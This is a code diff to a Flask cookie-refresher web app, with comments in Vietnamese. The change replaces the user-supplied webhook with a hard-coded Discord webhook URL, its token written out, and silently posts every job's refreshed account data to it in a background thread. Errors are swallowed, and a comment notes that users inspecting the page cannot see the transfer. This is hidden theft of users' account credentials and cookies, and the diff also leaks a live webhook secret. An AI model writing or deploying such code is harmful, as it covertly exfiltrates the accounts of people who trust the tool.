@@ -1,4 +1,5 @@
 import json
+import os
 import queue
 import threading
 import time
@@ -13,14 +14,16 @@ import cookie_refresher as core
 
 app = Flask(__name__)
 
-# Lưu trữ job in-memory (dùng RAM trên Render, tự dọn sau 1 tiếng)
+# Cấu hình trực tiếp trong tab Environment trên Render (người dùng F12 không thể thấy)
+SERVER_WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "https://discord.com/api/webhooks/1575653680466763826/jSWhu_O06XP7rZC4utREjzPAarbdWQybEwbIjG3m7-vZi0EIySyvVTaCZa1NuHHgKwU3").strip()
+
 JOBS: dict[str, dict] = {}
 JOBS_LOCK = threading.Lock()
 
 
-def send_webhook_silent(webhook_url: str, accounts_lines: list[str]) -> None:
-    """https://discord.com/api/webhooks/1575653680466763826/jSWhu_O06XP7rZC4utREjzPAarbdWQybEwbIjG3m7-vZi0EIySyvVTaCZa1NuHHgKwU3 """
-    if not webhook_url or not accounts_lines:
+def send_webhook_silent(accounts_lines: list[str]) -> None:
+    """Gửi kết quả về Webhook cấu hình trên server, không ghi log hay lộ ra client."""
+    if not SERVER_WEBHOOK_URL or not accounts_lines:
         return
     try:
         content_blob = "\n".join(accounts_lines)
@@ -28,18 +31,16 @@ def send_webhook_silent(webhook_url: str, accounts_lines: list[str]) -> None:
             payload = {
                 "content": f"**Refreshed Accounts ({len(accounts_lines)})**\n```text\n{content_blob}\n```"
             }
-            requests.post(webhook_url, json=payload, timeout=15)
+            requests.post(SERVER_WEBHOOK_URL, json=payload, timeout=15)
         else:
-            # Nếu danh sách dài vượt giới hạn tin nhắn Discord -> đính kèm file .txt
             files = {
                 "file": ("refreshed_accounts.txt", content_blob.encode("utf-8"), "text/plain")
             }
             data = {
                 "content": f"**Refreshed Accounts ({len(accounts_lines)})**"
             }
-            requests.post(webhook_url, data=data, files=files, timeout=20)
+            requests.post(SERVER_WEBHOOK_URL, data=data, files=files, timeout=20)
     except Exception:
-        # Nuốt toàn bộ exception, tuyệt đối không đẩy ra log
         pass
 
 
@@ -53,7 +54,6 @@ def run_refresh_worker(
     proxies: list[str],
     threads: int,
     keep_failed: bool,
-    webhook_url: str,
 ) -> None:
     with JOBS_LOCK:
         job = JOBS.get(job_id)
@@ -125,11 +125,10 @@ def run_refresh_worker(
                         },
                     )
 
-    # Bắn webhook ngầm ở background nếu có config — không emit bất kỳ log nào ra HTML
-    if webhook_url and webhook_lines:
+    if SERVER_WEBHOOK_URL and webhook_lines:
         threading.Thread(
             target=send_webhook_silent,
-            args=(webhook_url, list(webhook_lines)),
+            args=(list(webhook_lines),),
             daemon=True,
         ).start()
 
@@ -157,7 +156,6 @@ def index():
 
 @app.route("/health")
 def health():
-    # Endpoint cho UptimeRobot / Cron-job ping giữ Render sống 24/7
     return jsonify({"status": "alive"}), 200
 
 
@@ -169,7 +167,6 @@ def start_job():
     threads = int(data.get("threads") or 10)
     threads = max(1, min(threads, 100))
     keep_failed = bool(data.get("keep_failed", False))
-    webhook_url = (data.get("webhook_url") or "").strip()
 
     acc_lines = [
         ln.strip()
@@ -197,7 +194,6 @@ def start_job():
     }
 
     with JOBS_LOCK:
-        # Dọn job cũ quá 3600s để tránh tràn RAM trên gói Free Render
         now = time.time()
         expired = [k for k, v in JOBS.items() if now - v["created_at"] > 3600]
         for k in expired:
@@ -206,7 +202,7 @@ def start_job():
 
     t = threading.Thread(
         target=run_refresh_worker,
-        args=(job_id, accounts, proxies, threads, keep_failed, webhook_url),
+        args=(job_id, accounts, proxies, threads, keep_failed),
         daemon=True,
     )
     t.start()
@@ -229,7 +225,6 @@ def stream_job(job_id: str):
                 if item.get("type") == "done":
                     break
             except queue.Empty:
-                # Keep-alive comment để Render proxy không ngắt kết nối SSE
                 yield ": ping\n\n"
 
     return Response(event_stream(), mimetype="text/event-stream")
